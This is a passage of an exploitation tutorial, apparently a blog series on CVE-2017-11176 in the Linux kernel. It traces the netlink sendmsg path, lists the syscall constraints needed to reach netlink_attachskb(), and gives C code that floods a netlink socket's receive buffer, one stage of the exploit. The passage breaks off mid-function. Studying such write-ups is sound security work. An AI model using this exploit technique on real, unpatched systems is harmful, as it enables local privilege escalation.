<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_sndbuf</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">ENOBUFS</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">skb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloc_skb</span><span class="p">(</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">skb</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>Here, "len" is computed during <strong>__sys_sendmsg()</strong>. It is the "sum of all iovec len". So, the sum of all iovecs must be less than sk-&gt;sk_sndbuf minus 32 [0]. To keep it simple, we will use a single iovec. That is:</p><ul><li><strong>msg-&gt;msg_iovlen equals 1</strong> // a single iovec</li><li><strong>msg-&gt;msg_iov-&gt;iov_len is less than or equals than sk-&gt;sk_sndbuf minus 32</strong></li><li><strong>msg-&gt;msg_iov-&gt;iov_base must be <em>userland</em> readable</strong> // otherwise __sys_sendmsg() will fail</li></ul><p>The last constraint implies that <strong>msg-&gt;msg_iov is also a <em>userland</em> readable address</strong> (again, __sys_sendmsg() will fail otherwise).</p><p><strong>NOTE</strong>: "sk_sndbuf" is equivalent to "sk_rcvbuf" but for the sending buffer. We can retrieve its value with <strong>sock_getsockopt()</strong> option "SO_SNDBUF".</p><p>The check at [1] should not fail. If it does, it means that the kernel is currently running out-of-memory and is in a very bad shape for exploitation. The exploit should not continue, chances here are that it will fail, and worst, make the kernel crash! <strong>You've been warned, implement error handling code...</strong></p><p>The next code block can be ignored (no need to pass any checks), the "siocb-&gt;scm" structure is initialized early with scm_send():</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="n">NETLINK_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">).</span><span class="n">pid</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">NETLINK_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">).</span><span class="n">dst_group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dst_group</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">memcpy</span><span class="p">(</span><span class="n">NETLINK_CREDS</span><span class="p">(</span><span class="n">skb</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="o">-&gt;</span><span class="n">creds</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">ucred</span><span class="p">));</span><span class="w"></span>
<span class="w">      </span><span class="n">NETLINK_CB</span><span class="p">(</span><span class="n">skb</span><span class="p">).</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_skb_flags</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>Next:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">memcpy_fromiovec</span><span class="p">(</span><span class="n">skb_put</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">),</span><span class="w"> </span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_iov</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Again, no problem with the check [0] we already provide a <em>readable</em> iovec otherwise __sys_sendmsg() fails (cf. previous constraint).</p><div class="highlight"><pre><span></span><code>[0]   err = security_netlink_send(sk, skb);
      if (err) {
        kfree_skb(skb);
        goto out;
      }
</code></pre></div><p>This is a Linux Security Module (LSM, e.g. SELinux) check. If we can't pass this check, you will need to find another way to reach netlink_unicast() or more generally, another way to increase "sk_rmem_alloc" (hint: maybe try netlink_dump()). We assume that we pass this check here.</p><p>And finally:</p><div class="highlight"><pre><span></span><code><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dst_group</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">users</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">netlink_broadcast</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">dst_pid</span><span class="p">,</span><span class="w"> </span><span class="n">dst_group</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_unicast</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">dst_pid</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_flags</span><span class="o">&amp;</span><span class="n">MSG_DONTWAIT</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>Remember that we choose the "dst_group" value with "msg-&gt;msg_name-&gt;dst_group". Since we forced it to be zero, we will skip the check [0]... <strong>and finally call netlink_unicast()!</strong></p><p><em>Phew.... It has been a long way...</em></p><p>Alright, let's summarize all our requirements to (just) reach netlink_unicast() from netlink_sendmsg():</p><ul><li><strong>msg-&gt;msg_flags</strong> doesn't have the <em>MSG_OOB</em> flag</li><li><strong>msg-&gt;msg_controllen</strong> equals 0</li><li><strong>msg-&gt;msg_namelen</strong> is different from zero</li><li><strong>msg-&gt;msg_name-&gt;nl_family</strong> equals AF_NETLINK</li><li><strong>msg-&gt;msg_name-&gt;nl_groups</strong> equals 0</li><li><strong>msg-&gt;msg_name-&gt;nl_pid</strong> is different from 0 and points to the receiver socket</li><li>the sender netlink socket must use the <strong>NETLINK_USERSOCK</strong> protocol</li><li><strong>msg-&gt;msg_iovlen</strong> equals 1</li><li><strong>msg-&gt;msg_iov</strong> is a readable userland address</li><li><strong>msg-&gt;msg_iov-&gt;iov_len</strong> is lesser than or equals to sk_sndbuf minus 32</li><li><strong>msg-&gt;msg_iov-&gt;iov_base</strong> is a readable userland address</li></ul><p>What we've seen here is the kernel exploiter's duty. Analyzing each check, forcing a particular kernel path, tailoring your syscall parameters, etc. In practice, this is not that long to establish this list. Some paths are way more complex than this.</p><p>Let's move on and now reach netlink_attachskb().</p><h2 id="reach-netlink_attachskb-from-netlink_unicast">Reach netlink_attachskb() from netlink_unicast()</h2><p>This one should be easier than the previous one. netlink_unicast() is called with the following parameters:</p><div class="highlight"><pre><span></span><code><span class="n">netlink_unicast</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">dst_pid</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_flags</span><span class="o">&amp;</span><span class="n">MSG_DONTWAIT</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>Where:</p><ul><li><strong>sk</strong> is our sender netlink_sock</li><li><strong>skb</strong> is a socket buffer filled with <em>msg-&gt;msg_iov-&gt;iov_base</em> data of size <em>msg-&gt;msg_iov-&gt;iov_len</em></li><li><strong>dst_pid</strong> is a controlled pid (<em>msg-&gt;msg_name-&gt;nl_pid</em>) pointing to our receiver netlink socket</li><li><strong>msg-&gt;msg_flasg&amp;MSG_DONTWAIT</strong> indicates if netlink_unicast() should block or not</li></ul><p><strong>WARNING</strong>: Inside the netlink_unicast() code <strong>"ssk" is the sender socket and "sk" the receiver</strong>.</p><p>The netlink_unicast() code is:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_unicast</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">ssk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"></span>
<span class="w">            </span><span class="n">u32</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">nonblock</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">long</span><span class="w"> </span><span class="n">timeo</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">skb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_trim</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">gfp_any</span><span class="p">());</span><span class="w">   </span><span class="c1">// &lt;----- ignore this</span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="n">timeo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_sndtimeo</span><span class="p">(</span><span class="n">ssk</span><span class="p">,</span><span class="w"> </span><span class="n">nonblock</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="nl">retry</span><span class="p">:</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_getsockbypid</span><span class="p">(</span><span class="n">ssk</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">PTR_ERR</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">netlink_is_kernel</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">netlink_unicast_kernel</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">ssk</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sk_filter</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>

<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">   </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_attachskb</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="n">ssk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">retry</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="n">netlink_sendskb</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>In [0], sock_sndtimeo() sets the value of <strong>timeo</strong> (<em>timeout</em>) based on the <em>nonblock</em> parameter. Since we don't want to block (nonblock&gt;0), timeo will be zero. That is <strong>msg-&gt;msg_flags must set the MSG_DONTWAIT flag</strong>.</p><p>In [1], the destination netlink_sock "sk" is retrieved from the pid. As we will see in the next section, <strong>the destination netlink_sock needs to be bound</strong> prior to being retrieved with netlink_getsockbypid().</p><p>In [2], the destination socket must not be a "kernel" socket. A netlink sock is tagged <em>kernel</em> if it has the <em>NETLINK_KERNEL_SOCKET</em> flag. It means that it has been created with the netlink_kernel_create() function. Unfortunately, the NETLINK_GENERIC is one of them (from current exploit). So let's <strong>change the receiver socket protocol to NETLINK_USERSOCK</strong> as well. It also makes more sense by the way... Note that a reference is taken on receiver netlink_sock.</p><p>In [3], the BPF sock filter might apply. It can be skipped if we <strong>don't create any BPF filter for the receiver sock</strong>.</p><p>And.... The call [4] to netlink_attachskb()! Inside netlink_attachskb(), we are guaranteed to take one of those paths (should we past the code again?):</p><ol><li>the receiver buffer is not full: call skb_set_owner_r() -&gt; increase sk_rmem_alloc</li><li>the receiver buffer is full: netlink_attachskb() do not block and return -EAGAIN (timeout is zero)</li></ol><p><strong>That is, we have a way to know when the receive buffer is full (just check the error code of sendmsg()).</strong></p><p>Finally, the call [5] to netlink_sendskb() adds the skb to the receiver buffer list and drops the reference taken with netlink_getsockbypid(). Yay! :-)</p><p>Let's update the constraint list:</p><ul><li><strong>msg-&gt;msg_flags</strong> has the MSG_DONTWAIT flag set</li><li>the receiver netlink socket must be bound prior calling sendmsg()</li><li>the receiver netlink socket must use the <strong>NETLINK_USERSOCK</strong> protocol</li><li>don't define any BPF filter for the receiver socket</li></ul><p>We are very close to the final PoC now. We just need to bind the receiver socket.</p><h2 id="binding-the-receiver-socket">Binding the receiver socket</h2><p>Like any socket communication, two sockets can communicate by using "addresses". Since we are manipulating netlink socket, we'll use the "struct sockaddr_nl" type (cf. the manual):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">   </span><span class="n">sa_family_t</span><span class="w">     </span><span class="n">nl_family</span><span class="p">;</span><span class="w">  </span><span class="cm">/* AF_NETLINK */</span><span class="w"></span>
<span class="w">   </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="w">  </span><span class="n">nl_pad</span><span class="p">;</span><span class="w">     </span><span class="cm">/* Zero. */</span><span class="w"></span>
<span class="w">   </span><span class="kt">pid_t</span><span class="w">           </span><span class="n">nl_pid</span><span class="p">;</span><span class="w">     </span><span class="cm">/* Port ID. */</span><span class="w"></span>
<span class="w">   </span><span class="n">__u32</span><span class="w">           </span><span class="n">nl_groups</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Multicast groups mask. */</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>As we don't want to be part of a "broadcast group", <em>nl_groups</em> must be zero. The only important field here is "nl_pid".</p><p>Basically, <strong>netlink_bind()</strong> can take two paths:</p><ol><li>nl_pid is not zero: it calls <strong>netlink_insert()</strong></li><li>nl_pid is zero: it calls <strong>netlink_autobind()</strong>, which in turn calls netlink_insert()</li></ol><p>Note that calling netlink_insert() with an already used <em>pid</em> will fail with the error "-EADDRINUSE". Otherwise, a mapping is created between the <em>nl_pid</em> and the netlink sock. That is, the netlink sock can now be retrieved with netlink_getsockbypid(). In addition, <strong>netlink_insert() increases the sock reference counter by 1</strong>. Keep this in mind for the final proof-of-concept code.</p><p><strong>NOTE</strong>: Understanding how netlink stores the "pid:netlink_sock" mapping is explained in deeper details in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>.</p><p>While calling netlink_autobind() seems more natural, we actually <em>simulate it</em> (don't know why... laziness mostly...) from userland by bruteforcing the pid value (this is what autobind do) until bind() succeeds. Doing so, allows us to directly have the destination nl_pid value without calling getsockname(), and (might) ease debugging (really not sure about that :-)).</p><h2 id="putting-it-all-together">Putting It All Together</h2><p>It was quite a long run to get into all those paths but we are now ready to implement it in our exploit and finally reach our goal: <strong>netlink_attachskb() returns 1!</strong></p><p>Here is the strategy:</p><ol><li>Create two AF_NETLINK sockets with protocol NETLINK_USERSOCK</li><li>Bind the target (receiver) socket (i.e. the one that must have its receive buffer full)</li><li>[optional] Try to reduce the target socket receive buffer (less call to sendmsg())</li><li>Flood the target socket via <em>sendmsg()</em> from the sender socket until it returns EAGAIN</li><li>Close the sender socket (we won't need it anymore)</li></ol><p>You can run this single code in <em>standalone</em> to validate that everything works:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">prepare_blocking_socket</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">send_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="o">*</span><span class="mi">10</span><span class="p">];</span><span class="w"> </span><span class="c1">// should be less than (sk-&gt;sk_sndbuf - 32), you can use getsockopt()</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">new_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// this will be reset to SOCK_MIN_RCVBUF</span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">118</span><span class="p">,</span><span class="w"> </span><span class="c1">// must different than zero</span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">// no groups</span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"> </span><span class="n">iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="n">mhdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_namelen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_iovlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_control</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] preparing blocking netlink socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">send_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="p">(</span><span class="n">recv_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"socket"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] socket created (send_fd = %d, recv_fd = %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// simulate netlink_autobind()</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">_bind</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EADDRINUSE</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] bind"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink socket bound (nl_pid=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_RCVBUF</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">new_size</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">new_size</span><span class="p">)))</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] setsockopt"</span><span class="p">);</span><span class="w"> </span><span class="c1">// no worry if it fails, it is just an optim.</span>
<span class="w">  </span><span class="k">else</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] receive buffer reduced</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] flooding socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">_sendmsg</span><span class="p">(</span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mhdr</span><span class="p">,</span><span class="w"> </span><span class="n">MSG_DONTWAIT</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">  </span><span class="c1">// &lt;----- don't forget MSG_DONTWAIT</span>
<span class="w">    </span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EAGAIN</span><span class="p">)</span><span class="w">  </span><span class="c1">// &lt;----- did we failed because the receive buffer is full ?</span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] sendmsg"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] flood completed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">_close</span><span class="p">(</span><span class="n">send_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] blocking socket ready</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
